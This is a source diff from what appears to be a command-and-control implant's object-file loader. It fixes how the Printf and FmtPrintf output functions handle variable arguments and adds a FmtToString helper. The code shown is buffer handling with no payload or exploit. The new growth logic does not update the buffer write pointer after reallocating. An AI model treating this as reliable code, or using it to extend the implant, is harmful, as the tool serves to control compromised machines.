@@ -42,33 +42,44 @@ auto DECLFN Coff::Printf(
 ) -> VOID {
     G_KHARON
 
-    va_list VaList = { 0 };
-    va_start( VaList, fmt );
+    va_list VaList;
 
     VOID* MemRange = __builtin_return_address( 0 );
     CHAR* UUID     = nullptr;
-    ULONG MsgSize  = 0;
+    int   MsgSize  = 0;
+    int   written  = 0;
     CHAR* MsgBuff  = nullptr;
-    
+
+    // measure
+    va_start( VaList, fmt );
     MsgSize = Self->Msvcrt.vsnprintf( nullptr, 0, fmt, VaList );
+    va_end( VaList );
     if ( MsgSize < 0 ) {
-        KhDbg( "failed get the formated message size" ); goto _KH_END;
+        KhDbg( "Printf: vsnprintf size probe failed" ); goto _KH_END;
     }
 
-    MsgBuff = (CHAR*)hAlloc( MsgSize +1 );
-
-    if ( Self->Msvcrt.vsnprintf( MsgBuff, MsgSize, fmt, VaList ) < 0 ) {
-        KhDbg( "failed formating string" ); goto _KH_END;
+    // allocate (size = MsgSize+1 for the NUL)
+    MsgBuff = ( CHAR* )hAlloc( MsgSize + 1 );
+    if ( !MsgBuff ) {
+        KhDbg( "Printf: allocation failed" ); goto _KH_END;
     }
 
+    // format
+    va_start( VaList, fmt );
+    written = Self->Msvcrt.vsnprintf( MsgBuff, MsgSize + 1, fmt, VaList );
+    va_end( VaList );
+    if ( written < 0 ) {
+        KhDbg( "Printf: vsnprintf output failed" ); goto _KH_END;
+    }
+    MsgBuff[written] = '\0';  // just in case
+
+    // send
     UUID = Self->Cf->GetTask( MemRange );
-
-    KhDbg( "Message to send to the task id %s: %s [%d bytes]", UUID, MsgBuff, MsgSize );
-
+    KhDbg( "Printf: sending task %s -> \"%s\" [%d bytes]", UUID, MsgBuff, written );
     Self->Pkg->SendMsg( UUID, MsgBuff, type );
 
+    // cleanup
 _KH_END:
-    if ( VaList  ) va_end( VaList );
     if ( MsgBuff ) hFree( MsgBuff );
 }
 
@@ -139,15 +150,21 @@ auto DECLFN Coff::FmtPrintf(
 ) -> VOID {
     G_KHARON
 
-    va_list Args = { 0 };
-    INT32   Len  = 0;
+    va_list Args;
+    va_start( Args, Data);
 
-    va_start( Args, Data );
-    Len = Self->Msvcrt.vsnprintf( Fmt->buffer, Len, Data, Args );
+    // NUL space in FmtToString
+    size_t avail = Fmt->size - Fmt->length - 1;
+    int written = Self->Msvcrt.vsnprintf( Fmt->buffer, avail, Data, Args );
+
     va_end( Args );
+    if ( written < 0 ) {
+        KhDbg( "FmtPrintf: vsnprintf error" );
+        return;
+    }
 
-    Fmt->buffer += Len;
-    Fmt->length += Len;
+    Fmt->buffer += written;
+    Fmt->length += written;
 }
 
 auto DECLFN Coff::FmtInt(
@@ -160,6 +177,50 @@ auto DECLFN Coff::FmtInt(
     Fmt->buffer += 4;
     Fmt->length += 4;
     return;
+}
+
+auto DECLFN Coff::FmtToString(
+    FMTP* fmt,
+    PINT  size
+) -> PCHAR {
+    G_KHARON
+
+    // verify buffer not NULL
+    if ( !fmt || !fmt->original ) {
+        if ( size ) *size = 0;
+        return nullptr;
+    }
+
+    // clamp invalid lengths
+    if ( fmt->length < 0 ) {
+        KhDbg( "FmtToString: negative length %d, resetting to 0", fmt->length);
+        fmt->length = 0;
+    }
+
+    // ensure room for trailing NUL
+    if ( (UINT32)fmt->length >= fmt->size ) {
+        // grow by max(length+1, existing_size*2)
+        UINT32 newSize = max( (UINT32)fmt->length + 1, fmt->size * 2 );
+        CHAR* newbuf = ( CHAR* )hAlloc( newSize );
+        if ( !newbuf ) {
+            if ( size ) *size = 0;
+            return nullptr;
+        }
+        Mem::Copy( newbuf, fmt->original, fmt->length );
+        hFree( fmt->original );
+        fmt->original = newbuf;
+        fmt->size     = newSize;
+    }
+
+    // null-terminate
+    fmt->original[fmt->length] = '\0';
+
+    if ( size ) {
+        *size = fmt->length;
+    }
+
+    KhDbg( "FmtToString: length=%d, buffer=\"%s\"", fmt->length, fmt->original );
+    return fmt->original;
 }
 
 auto DECLFN Coff::IsAdmin( VOID ) -> BOOL {
